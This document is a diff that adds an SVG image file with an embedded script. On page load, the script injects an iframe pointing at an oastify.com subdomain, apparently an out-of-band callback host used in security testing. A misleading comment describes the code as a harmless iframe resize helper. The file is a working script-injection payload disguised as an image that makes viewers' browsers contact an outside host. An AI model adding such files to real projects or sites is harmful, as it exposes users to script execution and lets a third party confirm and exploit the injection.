@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script>
+    // Automatically resize iframe and interact with it
+    document.addEventListener("DOMContentLoaded", function() {
+      const iframe = document.createElement("iframe");
+      iframe.src = "http://c1e12z828k335qyjpaxf8s22ut0koacz.oastify.com";
+      iframe.width = "800";
+      iframe.height = "600";
+      document.body.appendChild(iframe);
+    });
+  </script>
+</svg>
